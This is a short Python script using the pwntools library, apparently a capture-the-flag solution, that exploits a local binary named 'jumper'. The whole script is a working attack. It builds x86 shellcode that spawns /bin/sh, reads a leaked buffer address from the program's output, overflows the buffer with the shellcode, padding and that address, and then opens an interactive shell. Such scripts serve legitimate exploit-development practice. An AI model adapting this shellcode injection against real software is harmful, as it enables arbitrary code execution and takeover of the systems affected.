from pwn import *

p = process("./jumper")

shellcode = asm('''
    mov eax, 0xb
    xor edx, edx
    xor ecx, ecx

    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    int 0x80
''')

print(len(shellcode))

p.recvuntil("&input=")
buffer = int(p.recvline().strip(), 16)

exploit = shellcode
exploit += b"A" * 5
exploit += p32(buffer)

p.sendlineafter("Hello\n", exploit)
p.interactive()
p.close()
